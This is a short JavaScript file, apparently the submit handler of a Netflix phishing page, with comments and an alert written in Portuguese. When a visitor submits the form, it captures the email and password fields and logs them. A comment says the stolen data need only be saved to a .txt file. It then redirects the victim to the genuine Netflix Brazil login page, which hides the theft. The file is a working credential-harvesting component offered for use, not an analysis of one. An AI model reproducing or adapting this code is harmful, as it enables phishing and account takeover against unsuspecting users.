function handler(e) {
    e.preventDefault();

    let email = document.querySelector('#email').value ;
    let password = document.querySelector('#password').value ;

    let linknet = "https://www.netflix.com/br/login";
    let netflix = document.createElement('a');
    netflix.href = linknet;

    if (email && password) {
        
        console.log(email);
        console.log(password);

        // {
        //     Basta Salvar estes dados num arquivo .txt
        // }
        
        document.body.appendChild(netflix);
        netflix.click();

 
    } else {
        alert('Campo de Email ou Senha esta Vazio, Por Favor Preencha!');
    }

}

window.onload = () => {
    const submit = document.querySelector('.form-submit');
    submit.addEventListener('click', handler);
}